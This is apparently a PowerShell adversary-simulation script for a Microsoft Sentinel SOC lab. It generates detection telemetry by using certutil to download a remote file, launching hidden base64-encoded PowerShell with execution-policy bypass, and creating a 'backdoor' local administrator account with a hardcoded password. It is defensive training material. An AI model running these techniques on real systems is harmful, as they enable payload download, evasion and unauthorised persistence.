<#
.SYNOPSIS
    Adversary Simulation Script for Azure Sentinel SOC Lab
.DESCRIPTION
    Safely simulates real adversary actions mapped to MITRE ATT&CK to generate
    telemetry for Windows Event Logs and Sysmon.
    Run this script inside your Azure Windows Target VM in an elevated PowerShell session.
#>

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "  Starting Adversary Simulation for Microsoft Sentinel Lab  " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# -------------------------------------------------------------------------
# Technique 1: Ingress Tool Transfer via LOLBAS (Certutil)
# MITRE ATT&CK: T1105 / T1218
# -------------------------------------------------------------------------
Write-Host "`n[+] Executing Technique 1: Certutil Remote Download (LOLBAS - T1105)..." -ForegroundColor Yellow
$downloadUrl = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md"
$destination = "$env:TEMP\simulated_payload.txt"

try {
    # Using certutil to simulate binary download bypass
    cmd.exe /c "certutil.exe -urlcache -split -f $downloadUrl $destination"
    Write-Host "    [OK] Certutil executed successfully. Telemetry sent to Sysmon Event 1." -ForegroundColor Green
} catch {
    Write-Host "    [!] Failed to execute Certutil: $_" -ForegroundColor Red
}

# -------------------------------------------------------------------------
# Technique 2: Obfuscated PowerShell Execution (Hidden & Encoded)
# MITRE ATT&CK: T1059.001 / T1027
# -------------------------------------------------------------------------
Write-Host "`n[+] Executing Technique 2: Obfuscated Encoded PowerShell (T1027)..." -ForegroundColor Yellow

# Benign command to be encoded: Write-Output 'SOC-Lab-Adversary-Simulation-Active'
$command = "Write-Output 'SOC-Lab-Adversary-Simulation-Active'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

try {
    powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand
    Write-Host "    [OK] Encoded PowerShell spawned. Telemetry sent to Sysmon Event 1." -ForegroundColor Green
} catch {
    Write-Host "    [!] Failed to execute PowerShell: $_" -ForegroundColor Red
}

# -------------------------------------------------------------------------
# Technique 3: Persistence via Local Administrator Creation
# MITRE ATT&CK: T1136.001 / T1098
# -------------------------------------------------------------------------
Write-Host "`n[+] Executing Technique 3: Creating Backdoor Local Admin Account (T1136.001)..." -ForegroundColor Yellow
$backdoorUser = "SOCBackdoorUser"
$password = "ComplexP@ssw0rd!2026"

try {
    # Check if user already exists
    if (-not (Get-LocalUser -Name $backdoorUser -ErrorAction SilentlyContinue)) {
        net user $backdoorUser $password /add
        net localgroup Administrators $backdoorUser /add
        Write-Host "    [OK] Backdoor user created and escalated. Telemetry sent to Security Event 4720 & 4732." -ForegroundColor Green
    } else {
        Write-Host "    [*] User $backdoorUser already exists. Skipping creation." -ForegroundColor Gray
    }
} catch {
    Write-Host "    [!] Error creating local account: $_" -ForegroundColor Red
}

# -------------------------------------------------------------------------
# Clean Up Reminder
# -------------------------------------------------------------------------
Write-Host "`n==========================================================" -ForegroundColor Cyan
Write-Host "  Attack Simulation Completed! Telemetry should appear in   " -ForegroundColor Cyan
Write-Host "  Microsoft Sentinel within 5 to 15 minutes.               " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "`nTo clean up the simulated account after testing, run:" -ForegroundColor White
Write-Host "  net user $backdoorUser /delete" -ForegroundColor Gray
Write-Host "  Remove-Item $destination -Force -ErrorAction SilentlyContinue" -ForegroundColor Gray
